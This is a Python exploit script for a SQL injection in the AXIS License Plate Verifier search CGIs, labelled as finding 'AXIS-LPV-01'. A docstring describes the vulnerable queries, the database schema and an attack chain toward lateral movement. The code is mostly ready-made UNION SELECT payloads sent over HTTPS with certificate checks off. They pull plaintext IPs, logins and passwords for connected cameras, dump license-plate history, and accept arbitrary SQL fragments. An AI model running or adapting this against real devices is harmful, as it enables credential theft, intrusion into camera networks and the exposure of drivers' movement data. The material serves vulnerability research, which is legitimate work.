"""
AXIS-LPV-01: SQL injection in License Plate Verifier search CGI
CONTROLLED ENVIRONMENT ONLY

Affected: AXIS License Plate Verifier (fflprapp) all versions through 3.0.13
          appId 333330, aarch64 ELF, ARTPEC-6/7/8/9

Root cause (confirmed via static analysis of fflprapp binary):

  search_v.cgi (viewer), search_o.cgi (operator), search.cgi (admin) all route
  HTTP GET/POST params directly into SQLite LIKE queries without parameterization:

    "AND LPR_UTF8 LIKE '%%%s%%'"
    "AND COUNTRY LIKE '%%%s%%'"
    "AND LP_DESCRIPTION LIKE '%%%s%%'"

  The %s slot receives raw CGI param values (plate=, country=, description=).
  No input sanitization, no prepared statements, no escaping.

  SQLite database path: /usr/local/packages/fflprapp/localdata/cfg/*.db
  Primary target table: LPR_EVENTS

  LPR_EVENTS schema (confirmed from CREATE TABLE string in binary):
    TS, MOD_TS, END_TS, CAR_ID, LPR, LPR_UTF8, LPR_UNICODE, RTIME,
    ACTION, ACT_PARAM, THRESHOLD, ROI_X, ROI_Y, ROI_W, ROI_H,
    LP_X, LP_Y, LP_W, LP_H, ROI_ID, ROI_IDU, FRAMES, DISTANCE,
    SPEED, DIRECTION, LP_BMP, ROI_BMP, COUNTRY, LP_LIST_MODE,
    LP_DESCRIPTION, LP_REGION_UTF8, ISO3166_2_CODE, LP_TYPE,
    EXT1, EXT2, EXT3, CAR_MAKER, CAR_MODEL, CAR_M_TYPE, CAR_COLOR,
    CAR_CONF, CAR_VIEW, CAR_COLOR_CONF

  Secondary pivot table: CAMERA_BWLIST
    CAMERA_NAME, CAMERA_IP, CAMERA_LOGIN, CAMERA_PASSWORD, CAMERA_SYNC
    Stores plaintext credentials for synchronized slave cameras.

  Chain:
    Viewer-level auth → search_v.cgi?plate=INJECT → UNION SELECT →
    CAMERA_PASSWORD from CAMERA_BWLIST → lateral movement to slave cameras.

  Severity: HIGH (viewer-level auth required)
  Confirmed: all LPR_UTF8/COUNTRY/LP_DESCRIPTION LIKE strings present in binary
  SDK origin: Flash Forward (gitlab.f-f.kyiv.ua) — ANPR engine embedded in fflprapp

References:
  Binary: /usr/local/packages/fflprapp/fflprapp (aarch64 ELF stripped)
  DB: /usr/local/packages/fflprapp/localdata/cfg/
  CGI: search_v.cgi (viewer), search_o.cgi (operator), search.cgi (admin)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
import ssl
from typing import Optional

FINDING = "AXIS-LPV-01"
LABEL = "SQL injection in License Plate Verifier search CGI"

# CGI endpoints keyed by access level
CGI_MAP = {
    "viewer":   "/local/fflprapp/search_v.cgi",
    "operator": "/local/fflprapp/search_o.cgi",
    "admin":    "/local/fflprapp/search.cgi",
}

# Column counts must match LPR_EVENTS schema for UNION to succeed.
# LPR_EVENTS has 43 columns (confirmed from CREATE TABLE string).
LPR_EVENTS_COLS = 43

# Probe payload: force UNION SELECT to surface a known sentinel string.
# Terminates the LIKE clause, injects UNION, pads remaining columns with NULL.
def _union_payload(target_expr: str, col_index: int = 1, total_cols: int = LPR_EVENTS_COLS) -> str:
    """
    Build: ' UNION SELECT <nulls> --
    col_index (0-based) is replaced with target_expr.
    """
    cols = ["NULL"] * total_cols
    cols[col_index] = target_expr
    return f"' UNION SELECT {','.join(cols)} --"


# Pre-built payloads for high-value targets
PAYLOADS = {
    "confirm": (
        "plate",
        _union_payload("'AXIS_LPV01_SQLI_CONFIRMED'", col_index=4),
        "LPR column in results contains sentinel string",
    ),
    "camera_passwords": (
        "plate",
        _union_payload(
            "(SELECT GROUP_CONCAT(CAMERA_IP||':'||CAMERA_LOGIN||':'||CAMERA_PASSWORD,',') FROM CAMERA_BWLIST)",
            col_index=4,
        ),
        "Extracts all slave camera IPs + plaintext creds from CAMERA_BWLIST",
    ),
    "plate_history": (
        "plate",
        _union_payload("LPR_UTF8", col_index=4) + " FROM LPR_EVENTS WHERE 1=1 --",
        "Dump full plate history",
    ),
    "sqlite_version": (
        "plate",
        _union_payload("sqlite_version()", col_index=4),
        "SQLite version banner — confirms injection and DB engine",
    ),
    "camera_count": (
        "plate",
        _union_payload("(SELECT COUNT(*) FROM CAMERA_BWLIST)", col_index=4),
        "Count of slave cameras with stored credentials",
    ),
}


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _basic_auth(user: str, password: str) -> str:
    import base64
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def search_request(
    host: str,
    port: int,
    cgi: str,
    param: str,
    value: str,
    user: str,
    password: str,
    timeout: int = 15,
) -> dict:
    """
    Send a search CGI request with an injected parameter value.
    Returns parsed JSON response or raw text on parse failure.
    """
    qs = urllib.parse.urlencode({param: value})
    url = f"https://{host}:{port}{cgi}?{qs}"
    headers = {"Authorization": _basic_auth(user, password)}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            try:
                return {"status": r.status, "body": json.loads(raw), "ok": True}
            except Exception:
                return {"status": r.status, "body": raw.decode("utf-8", errors="replace"), "ok": True}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode("utf-8", errors="replace"), "ok": False}
    except Exception as e:
        return {"status": None, "body": str(e), "ok": False}


def run_payload(
    host: str,
    port: int,
    access_level: str,
    payload_name: str,
    user: str,
    password: str,
    timeout: int = 15,
) -> dict:
    """
    Run a named pre-built payload against the search CGI at the specified access level.
    """
    cgi = CGI_MAP.get(access_level)
    if not cgi:
        raise ValueError(f"Unknown access level: {access_level}. Use: {list(CGI_MAP)}")
    if payload_name not in PAYLOADS:
        raise ValueError(f"Unknown payload: {payload_name}. Use: {list(PAYLOADS)}")

    param, value, description = PAYLOADS[payload_name]
    result = search_request(host, port, cgi, param, value, user, password, timeout)
    result["payload"] = payload_name
    result["description"] = description
    result["injected_param"] = param
    return result


def custom_inject(
    host: str,
    port: int,
    access_level: str,
    param: str,
    sql_fragment: str,
    user: str,
    password: str,
    timeout: int = 15,
) -> dict:
    """
    Inject a raw SQL fragment into the specified param.
    The fragment is appended directly after the param value in the LIKE query.
    Example sql_fragment: "' UNION SELECT sqlite_version(),NULL,NULL,...  --"
    """
    cgi = CGI_MAP.get(access_level)
    if not cgi:
        raise ValueError(f"Unknown access level: {access_level}")
    return search_request(host, port, cgi, param, sql_fragment, user, password, timeout)


def probe_all_payloads(
    host: str,
    port: int,
    access_level: str,
    user: str,
    password: str,
) -> list[dict]:
    results = []
    for name in PAYLOADS:
        r = run_payload(host, port, access_level, name, user, password)
        results.append(r)
        ok = "OK" if r["ok"] else "FAIL"
        print(f"  [{ok}] {name}: {str(r['body'])[:120]}")
    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    parser.add_argument("host", help="Camera IP or hostname")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--user", default="root", help="Camera username")
    parser.add_argument("--password", required=True)
    parser.add_argument(
        "--level", default="viewer", choices=list(CGI_MAP),
        help="CGI access level to target (default: viewer)"
    )
    parser.add_argument(
        "--payload", default="confirm", choices=list(PAYLOADS),
        help="Pre-built payload to run"
    )
    parser.add_argument("--all", action="store_true", help="Run all payloads")
    parser.add_argument("--sql", help="Raw SQL fragment for custom injection")
    parser.add_argument("--param", default="plate", help="CGI param to inject into")
    parser.add_argument("--json", action="store_true", dest="json_out")
    args = parser.parse_args()

    print(f"[{FINDING}] {LABEL}")
    print(f"  Target: https://{args.host}:{args.port}")
    print(f"  Level:  {args.level} ({CGI_MAP[args.level]})")
    print()

    if args.sql:
        r = custom_inject(args.host, args.port, args.level, args.param, args.sql, args.user, args.password)
        if args.json_out:
            print(json.dumps(r, indent=2))
        else:
            print(f"Status: {r['status']}")
            print(f"Body:   {str(r['body'])[:500]}")
    elif args.all:
        results = probe_all_payloads(args.host, args.port, args.level, args.user, args.password)
        if args.json_out:
            print(json.dumps(results, indent=2))
    else:
        r = run_payload(args.host, args.port, args.level, args.payload, args.user, args.password)
        if args.json_out:
            print(json.dumps(r, indent=2))
        else:
            print(f"Payload:     {r['payload']}")
            print(f"Description: {r['description']}")
            print(f"Status:      {r['status']}")
            print(f"Body:        {str(r['body'])[:500]}")
